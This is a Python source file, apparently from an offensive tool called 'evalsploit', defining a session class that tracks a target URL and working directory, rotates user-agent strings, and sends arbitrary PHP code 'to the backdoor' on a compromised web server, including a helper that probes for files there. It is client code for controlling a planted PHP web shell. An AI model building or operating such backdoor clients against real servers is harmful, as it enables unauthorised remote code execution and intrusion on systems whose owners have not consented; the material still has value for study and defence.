"""Session context: url, pwd, config, send()."""

from __future__ import annotations

import random
from pathlib import Path
from typing import TYPE_CHECKING, Callable

from evalsploit.config import EvalsploitConfig, project_root
from evalsploit.modules.base import php_quote

if TYPE_CHECKING:
    pass


class SessionContext:
    """Holds config, current pwd, user-agent, and send delegate."""

    MARKER = "SPLITLINE_SPLITLINE_SPLITLINE"

    def __init__(
        self,
        config: EvalsploitConfig,
        send_fn: Callable[["SessionContext", str], str],
    ) -> None:
        self.config = config
        self.pwd: str = "/"
        self._uagent: str = ""
        self._send_fn = send_fn

    @property
    def url(self) -> str:
        return self.config.url

    @property
    def uagent(self) -> str:
        if not self._uagent:
            ua_path = project_root() / "data" / "useragents"
            if ua_path.exists():
                lines = ua_path.read_text(encoding="utf-8", errors="ignore").splitlines()
                self._uagent = random.choice(lines).strip() if lines else "evalsploit/3.0"
            else:
                self._uagent = "evalsploit/3.0"
        return self._uagent

    def send(self, php_code: str) -> str:
        """Send PHP to the backdoor and return parsed response (our output only)."""
        return self._send_fn(self, php_code)

    def resolve_path(self, arg: str) -> str:
        """Resolve path: absolute if starts with /, else pwd + '/' + arg. Normalize //."""
        if not arg.strip():
            return self.pwd
        if arg.strip().startswith("/"):
            return arg.strip().replace("//", "/")
        path = (self.pwd.rstrip("/") + "/" + arg.strip().lstrip("/")).replace("//", "/")
        return path

    def file_exists(self, path: str) -> bool:
        """Check if path exists on server (file or dir). Returns True/False."""
        php = f"echo @file_exists({php_quote(path)}) ? '1' : '0';"
        out = self.send(php).strip()
        return out == "1"
